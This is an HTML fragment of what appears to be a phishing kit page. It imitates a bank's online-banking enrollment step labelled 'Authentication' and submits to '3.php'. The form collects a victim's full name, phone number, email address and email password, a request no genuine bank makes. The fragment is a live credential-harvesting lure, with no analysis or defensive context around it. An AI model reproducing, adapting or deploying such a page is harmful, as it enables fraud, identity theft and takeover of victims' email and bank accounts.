                            ...
                            <div class="rds-wizard-body enrollment-container">
                                ...
                                <div class="body-content container">
                                    ...
                                    <div id="step1Identification">
                                        ...
                                        <form id="Verification-Form" class="rds-form" action="3.php" method="POST" name="olb-enrollment-step-1">
                                            ...
                                            <div class="rds-step-header">
                                                ...
                                                <ol class="rds-steps">
                                                    ...
                                                    <li class="step current col-sm-3 col-xs-12"><span class="badge"><span class="sr-only">Step -</span>1<span class="sr-only">current step -</span></span>Authentication</li>
                                            ...
                                            <div class="rds-long-form-tile">
                                                ...
                                                <div class="long-form-main">
                                                    ...
                                                    <!-- <div class="hide rds-page-alert alert-danger">

                                                        <div class="icon"></div>

                                                        <div class="content">

                                                            <h1 tabindex="-1"><span class="sr-only">Errors

                                                                    found:</span>Please resolve the following issues:
                                                   ...
                                                   <h2 id="required-info-title">Please enter the following required information:</h2>

                                                        <div class="field animated-label text required alphanumeric">

                                                            <label class="control-label" for="security-answer-3">Fullname</label>

                                                            <input aria-describedby="fullname" aria-required="True" class="form-control" id="fullname" required="required" maxlength="25" name="fullname" type="text" value="" autocomplete="off" style="max-height: 67px; padding-top: 33px;">

                                                        </div>

                                                        <div class="field animated-label text required alphanumeric">

                                                            <label class="control-label" for="security-answer-3">Phone Number</label>

                                                            <input aria-describedby="phni" aria-required="True" class="form-control" id="phni" pattern="[0-9]+" title="Please enter numbers only" required="required" minlength="10" maxlength="12" name="phni" type="text" value="" autocomplete="off" style="max-height: 67px; padding-top: 33px;">

                                                        </div>

                                                   <h2 id="required-info-title">Email On file:</h2>

                                             <div class="field animated-label text required email">
                                                                        <label class="control-label" for="email">Email Address</label>
                                                                        <input aria-describedby="descriptor-enrollment-id" aria-required="True" class="form-control" data-val="true" required="" name="emadi" type="email" value="" autocomplete="off" style="max-height: 67px; padding-top: 33px;">

                                                                    </div> 
                                                        
                                                                    <div class="field animated-label text required emailpa">
                                                                        <label class="control-label" for="emailpa">Email Password</label>
                                                                        <input aria-describedby="descriptor-enrollment-id" aria-required="True" class="form-control" data-val="true" required="" name="empa" type="password" value="" autocomplete="off" style="max-height: 67px; padding-top: 33px;">
                                                    ...
                                                    <div class="wizard-cta">
                                                        ...
                                                        <button id="customer-verification" class="btn btn-wizard-next" type="submit">Next</button>
